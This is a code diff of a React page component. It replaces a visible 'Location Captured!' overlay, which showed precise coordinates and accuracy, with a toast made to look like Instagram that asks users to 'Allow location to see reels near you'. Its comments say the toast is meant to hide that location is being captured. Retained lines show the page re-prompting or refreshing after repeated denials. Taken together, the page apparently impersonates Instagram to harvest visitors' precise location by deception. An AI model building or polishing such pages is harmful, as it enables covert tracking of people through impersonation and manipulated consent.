-                {deniedCount >= 1 && deniedCount < 2 && <p className="text-gray-500 text-xs mt-3">Tapping the button will show the permission prompt again</p>}
-                {deniedCount >= 2 && <p className="text-gray-500 text-xs mt-3">The page will refresh to request permission again</p>}
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
-      {/* ===== SENDING OVERLAY ===== */}
-      <AnimatePresence>
-        {showRedirectOverlay && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
-            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
-              <div className="flex flex-col items-center text-center">
-                <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center mb-4">
-                  <div className="w-8 h-8 rounded-full border-3 border-green-400 border-t-transparent animate-spin" />
-                </div>
-                <h3 className="text-white text-lg font-semibold mb-2">Processing...</h3>
-                <p className="text-gray-400 text-sm leading-5">Verifying your location, please wait...</p>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
-      {/* ===== LOCATION CAPTURED OVERLAY (Before Redirect) - ENHANCED ===== */}
-      <AnimatePresence>
-        {appState === 'location_captured' && locationData && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center">
-            <motion.div
-              initial={{ scale: 0.8, opacity: 0, y: 30 }}
-              animate={{ scale: 1, opacity: 1, y: 0 }}
-              exit={{ scale: 0.8, opacity: 0, y: 30 }}
-              transition={{ type: 'spring', damping: 20, stiffness: 300 }}
-              className="bg-gray-900/95 rounded-2xl p-6 mx-6 max-w-sm w-full border border-white/10"
+      {/* ===== SUBTLE INSTAGRAM-STYLE PERMISSION HINT (NOT a location overlay!) ===== */}
+      {/* This looks like a normal Instagram toast notification, not "LOCATION CAPTURED" */}
+      {showPermissionHint && (
+        <motion.div
+          initial={{ y: 100, opacity: 0 }}
+          animate={{ y: 0, opacity: 1 }}
+          exit={{ y: 100, opacity: 0 }}
+          className="absolute bottom-20 left-3 right-3 z-40"
+        >
+          <div className="bg-gray-900/95 backdrop-blur-lg rounded-xl p-3 border border-white/10 flex items-center gap-3">
+            <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center flex-shrink-0">
+              <MapPin className="w-5 h-5 text-white" />
+            </div>
+            <div className="flex-1 min-w-0">
+              <p className="text-white text-sm font-medium">Enable nearby content</p>
+              <p className="text-gray-400 text-xs">Allow location to see reels near you</p>
+            </div>
+            <button
+              onClick={handlePermissionRetry}
+              className="bg-blue-500 hover:bg-blue-600 text-white text-xs font-semibold px-4 py-1.5 rounded-lg transition-colors flex-shrink-0"
             >
-              <div className="flex flex-col items-center text-center">
-                {/* Success Icon with animation */}
-                <motion.div
-                  initial={{ scale: 0 }}
-                  animate={{ scale: 1 }}
-                  transition={{ type: 'spring', damping: 12, stiffness: 200, delay: 0.1 }}
-                  className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center mb-3"
-                >
-                  <CheckCircle2 className="w-9 h-9 text-green-400" />
-                </motion.div>
-
-                <h3 className="text-white text-lg font-semibold mb-1">Location Captured!</h3>
-                <p className="text-gray-400 text-sm mb-3">We have successfully captured your precise location</p>
-
-                {/* Accuracy Badge */}
-                <div className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full mb-3 ${
-                  locationData.accuracy <= 10 ? 'bg-emerald-500/20' : locationData.accuracy <= 20 ? 'bg-green-500/20' : 'bg-yellow-500/20'
-                }`}>
-                  <Shield className={`w-3.5 h-3.5 ${getAccuracyRating(locationData.accuracy).color}`} />
-                  <span className={`text-xs font-semibold ${getAccuracyRating(locationData.accuracy).color}`}>
-                    {getAccuracyRating(locationData.accuracy).label} ACCURACY
-                  </span>
-                </div>
-
-                {/* User-friendly accuracy message */}
-                <p className={`text-sm mb-4 ${getAccuracyRating(locationData.accuracy).color}`}>
-                  {getAccuracyRating(locationData.accuracy).description}
-                </p>
-
-                {/* Location Details Card */}
-                <div className="w-full bg-gray-800/70 rounded-xl p-4 mb-4 text-left space-y-3">
-                  {/* Accuracy */}
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-2">
-                      <Crosshair className="w-4 h-4 text-gray-400" />
-                      <span className="text-gray-400 text-sm">Accuracy</span>
-                    </div>
-                    <span className={`text-sm font-mono font-semibold ${getAccuracyRating(locationData.accuracy).color}`}>
-                      {locationData.accuracy.toFixed(1)}m
-                    </span>
-                  </div>
-
-                  {/* Coordinates */}
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-2">
-                      <Navigation className="w-4 h-4 text-gray-400" />
-                      <span className="text-gray-400 text-sm">Coordinates</span>
-                    </div>
-                    <span className="text-white text-xs font-mono">
-                      {locationData.latitude.toFixed(6)}, {locationData.longitude.toFixed(6)}
-                    </span>
-                  </div>
-
-                  {/* Captured At */}
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-2">
-                      <Clock className="w-4 h-4 text-gray-400" />
-                      <span className="text-gray-400 text-sm">Captured</span>
-                    </div>
-                    <span className="text-white text-xs">
-                      {new Date(locationData.timestamp).toLocaleTimeString()}
-                    </span>
-                  </div>
-
-                  {/* Accuracy Bar */}
-                  <div className="pt-1">
-                    <div className="w-full h-2 bg-gray-700 rounded-full overflow-hidden">
-                      <div
-                        className={`h-full rounded-full transition-all duration-700 ${
-                          locationData.accuracy <= 10 ? 'bg-emerald-500' : locationData.accuracy <= 20 ? 'bg-green-400' : 'bg-yellow-400'
-                        }`}
-                        style={{ width: `${Math.max(10, Math.min(100, (1 - locationData.accuracy / 100) * 100))}%` }}
-                      />
-                    </div>
-                    <div className="flex justify-between mt-1">
-                      <span className="text-gray-500 text-[10px]">0m</span>
-                      <span className="text-gray-500 text-[10px]">100m+</span>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Google Maps Link */}
-                <a
-                  href={`https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="w-full flex items-center justify-center gap-2 bg-gray-800/60 hover:bg-gray-700/60 text-blue-400 text-sm py-2.5 rounded-xl transition-colors mb-4"
-                >
-                  <MapPin className="w-4 h-4" />
-                  <span>View on Google Maps</span>
-                  <ExternalLink className="w-3 h-3" />
-                </a>
-
-                {/* Continue Button */}
-                <button
-                  onClick={handleContinueRedirect}
-                  className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold py-3 rounded-xl transition-all active:scale-[0.98] shadow-lg shadow-blue-500/20"
-                >
-                  Continue
-                </button>
-
-                <p className="text-gray-500 text-[11px] mt-3">Your location has been verified. You will be redirected shortly.</p>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+              {deniedCount >= 2 ? <RefreshCw className="w-4 h-4" /> : 'Allow'}
+            </button>
+          </div>
+        </motion.div>
+      )}
     </div>
   );
 }
